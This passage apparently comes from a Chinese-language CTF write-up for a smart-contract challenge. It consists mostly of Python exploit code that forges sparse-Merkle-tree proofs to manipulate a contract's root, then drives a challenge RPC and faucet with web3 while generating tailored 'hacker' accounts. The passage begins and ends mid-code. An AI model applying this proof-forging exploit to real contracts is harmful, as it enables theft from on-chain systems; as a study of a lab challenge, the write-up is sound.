class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009b&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">19</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">20</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">21</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">22</span>):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getProof</span>(<span class=\"params\">b1,b2,h</span>):</span><br><span class=\"line\">    proof = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = h</span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = b1</span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = b2</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> proof</span><br><span class=\"line\"></span><br><span class=\"line\">    leaf[<span class=\"number\">0</span>] = <span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span></span><br><span class=\"line\">    leaf[<span class=\"number\">1</span>] = <span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span></span><br><span class=\"line\">    leaf[<span class=\"number\">2</span>] = <span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span></span><br><span class=\"line\">    leaf[<span class=\"number\">3</span>] = <span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span></span><br><span class=\"line\">    leaf[<span class=\"number\">4</span>] = <span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter1</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter2</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x799d6ded98975eb22e289ea90ff6f3f327537299ab8325e695c61d31ee711c56&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># 根据顺序调整height </span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000002&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter3</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0xcc2f18436e39156aa78964ff9e33acb4778bfd7a3182a20a5e86e2578a2dd334&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter4</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x68ee889a32ce609fc0acbf31dd1cc40b522d2c1fcabc0b0d5d2cd66cde478338&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enter5</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    b1 = <span class=\"string\">&#x27;0x2510d5ab38c5a927545402b81c45a0b780bb7de6d395a41c0f2828381298f2db&#x27;</span></span><br><span class=\"line\">    b2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    h = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof = getProof(b1,b2,h)</span><br><span class=\"line\">    prevLeaves = [Leaf(<span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span>,<span class=\"number\">0</span>)]</span><br><span class=\"line\">    nextLeaves = [Leaf(<span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span>,<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;----enter5----&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,prevLeaves,oldroot) == oldroot</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;--------------&#x27;</span>)</span><br><span class=\"line\">    root = calcRoot(proof,nextLeaves,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pickupTreasureChest</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 先做这个 根据递增的要求构造出5个地址 记录merge的顺序</span></span><br><span class=\"line\">    c1 = <span class=\"string\">&#x27;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&#x27;</span></span><br><span class=\"line\">    c2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    leaf = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\">    leaf[<span class=\"number\">0</span>] = <span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span></span><br><span class=\"line\">    leaf[<span class=\"number\">1</span>] = <span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span></span><br><span class=\"line\">    leaf[<span class=\"number\">2</span>] = <span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span></span><br><span class=\"line\">    leaf[<span class=\"number\">3</span>] = <span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span></span><br><span class=\"line\">    leaf[<span class=\"number\">4</span>] = <span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(leaf)):</span><br><span class=\"line\">        leaf[i] = Leaf(leaf[i],<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">19</span></span><br><span class=\"line\">    proof = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = c1</span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = c2</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    root = calcRoot(proof,leaf,oldroot)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">findKey</span>(<span class=\"params\">oldroot</span>):</span><br><span class=\"line\">    c1 = <span class=\"string\">&#x27;0xbccd02410d2e51fe9783b9597d341834148ebbfd545ad02023fcf29e54ffc35e&#x27;</span></span><br><span class=\"line\">    c2 = <span class=\"string\">&#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\">    leaf = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\">    leaf[<span class=\"number\">0</span>] = <span class=\"number\">0x0a89D7a3f8cD2b1f7d80F18f983bAbd903fA3f38</span></span><br><span class=\"line\">    leaf[<span class=\"number\">1</span>] = <span class=\"number\">0x1424021b77400221b9E86422571F76bF50acd44c</span></span><br><span class=\"line\">    leaf[<span class=\"number\">2</span>] = <span class=\"number\">0x2d922703AE5614675Bbc3c3D5Bed1Ab933B350dB</span></span><br><span class=\"line\">    leaf[<span class=\"number\">3</span>] = <span class=\"number\">0x45AD33c37e5029804794f390cB2474349F2aDf12</span></span><br><span class=\"line\">    leaf[<span class=\"number\">4</span>] = <span class=\"number\">0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(leaf)):</span><br><span class=\"line\">        leaf[i] = Leaf(leaf[i],<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">19</span></span><br><span class=\"line\">    proof = [<span class=\"number\">0</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n)]</span><br><span class=\"line\">    proof[<span class=\"number\">0</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">1</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">2</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">3</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009c&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">4</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">5</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009d&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">7</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">8</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">9</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009e&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    proof[<span class=\"number\">10</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000004c&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">11</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000048&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">12</span>] = <span class=\"string\">&#x27;0x000000000000000000000000000000000000000000000000000000000000009f&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">13</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">14</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">15</span>] = c1</span><br><span class=\"line\"></span><br><span class=\"line\">    proof[<span class=\"number\">16</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000050&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">17</span>] = <span class=\"string\">&#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\">    proof[<span class=\"number\">18</span>] = c2</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">        proof[i] = <span class=\"built_in\">bytes</span>.fromhex(proof[i][<span class=\"number\">2</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> calcRoot(proof,leaf,oldroot) == oldroot</span><br><span class=\"line\">    <span class=\"keyword\">return</span> oldroot</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">def leave(oldroot):</span></span><br><span class=\"line\"><span class=\"string\">    b1 = &#x27;0x2510d5ab38c5a927545402b81c45a0b780bb7de6d395a41c0f2828381298f2db&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    b2 = &#x27;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    h = &#x27;0x0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    proof = getProof(b1,b2,h)</span></span><br><span class=\"line\"><span class=\"string\">    prevLeaves = [Leaf(0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd,1)]</span></span><br><span class=\"line\"><span class=\"string\">    nextLeaves = [Leaf(0x97D2419F5D6C7098b35c78e8D7c10A2Fe8C08EBd,0)]</span></span><br><span class=\"line\"><span class=\"string\">    assert calcRoot(proof,prevLeaves,oldroot) == oldroot</span></span><br><span class=\"line\"><span class=\"string\">    print(&#x27;next&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">    root = calcRoot(proof,nextLeaves,oldroot)</span></span><br><span class=\"line\"><span class=\"string\">    return root</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    root = init()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;---------init finish------------&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    root = enter1(root)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    root = enter2(root)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    root = enter3(root)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    root = enter4(root)</span><br><span class=\"line\">  </span><br><span class=\"line\">    root = enter5(root)</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    root = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    root = pickupTreasureChest(root)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    findKey(root)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#print(calcLeaf(Leaf(0x07DEB941F3feA2B239996E723E0000C8d79d3b38,1)).hex())</span></span><br></pre></td></tr></table></figure>\n\n\n<p>每次enter只需要记录上次enter修改root的最后一次merge就行<br>但pickupTreasureChest需要用到每次merge的信息<br>并且calcRoot计算的时候需要根据key决定merge的顺序<br>所以4个hacker的地址是需要精心构造的<br>先模拟一遍pickupTreasureChest 然后根据merge的顺序对应调整enter时merge的顺序（改height）<br>findKey的思路和enter差不多，因为mode是0所以value是0，只要把0都merge掉然后拿最后两个哈希值做一遍merge就能通过验证</p>\n<p>exp用了5次enter是因为本来以为需要利用一次leave，后来发现不需要，实际上4次enter就够了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> eth_abi <span class=\"keyword\">import</span> encode_abi</span><br><span class=\"line\"><span class=\"keyword\">from</span> web3 <span class=\"keyword\">import</span> Web3</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests, time</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">ONE_SHOT_MODE = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&quot;http://123.60.45.88:8545&quot;</span>)) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Globals</span></span><br><span class=\"line\">keccak = w3.keccak</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getMoney</span>(<span class=\"params\">target</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(w3.eth.get_balance(target))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> requests.post(<span class=\"string\">&#x27;http://123.60.45.88:8080/api/claim&#x27;</span>, data = &#123;<span class=\"string\">&#x27;address&#x27;</span>: target&#125;).status_code == <span class=\"number\">200</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] waiting for 30s for test ether&#x27;</span>)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">30</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(w3.eth.get_balance(target))</span><br><span class=\"line\"></span><br><span class=\"line\">deploy = <span class=\"string\">&#x27;0x1a20D3FF9D41440D9C6B93462A4f656496c693F8&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#getMoney(deploy)</span></span><br><span class=\"line\"><span class=\"comment\">#exit(0)</span></span><br><span class=\"line\">final_target = <span class=\"string\">&#x27;0x6991DD5156BBD73aae507F6A6020C960F2F8b9e7&#x27;</span></span><br><span class=\"line\">root = w3.eth.get_storage_at(final_target,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">target</span>):</span><br><span class=\"line\">    code = w3.eth.get_code(target)</span><br><span class=\"line\">    storage = w3.eth.get_storage_at(target,<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;root:<span class=\"subst\">&#123;storage.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    storage = w3.eth.get_storage_at(target,<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;smtMode:<span class=\"subst\">&#123;storage.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    storage = w3.eth.get_storage_at(target,<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;address:<span class=\"subst\">&#123;storage.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    storage = w3.eth.get_storage_at(target,<span class=\"number\">3</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;solved:<span class=\"subst\">&#123;storage.<span class=\"built_in\">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class=\"line\">check(final_target)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getAccount</span>():</span><br><span class=\"line\">    acc = w3.eth.account.create()</span><br><span class=\"line\">    hacker, sk_hacker = acc.address, acc.key</span><br><span class=\"line\">    <span class=\"comment\">#print(&#x27;[+] hacker:&#x27;, hacker)</span></span><br><span class=\"line\">    <span class=\"comment\">#print(bin(int(hacker,base=16)))</span></span><br><span class=\"line\">    <span class=\"comment\">#print(&#x27;[+] key:&#x27;,sk_hacker)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hacker,sk_hacker</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">findHacker</span>():</span><br><span class=\"line\">    find = []</span><br><span class=\"line\">    hackers = []</span><br><span class=\"line\">    sk_hackers = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">        h,s = getAccount()</span><br><span class=\"line\">        hackers.append(h)</span><br><span class=\"line\">        sk_hackers.append(s)</span><br><span class=\"line\">        binary = <span class=\"built_in\">bin</span>(<span class=\"built_in\">int</span>(h,base=<span class=\"number\">16</span>))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">        binary = (<span class=\"number\">160</span> - <span class=\"built_in\">len</span>(binary)) * <span class=\"string\">&#x27;0&#x27;</span> + binary</span><br><span class=\"line\">        <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> k <span class=\"keyword\">in</span> find:</span><br><span class=\"line\">                <span 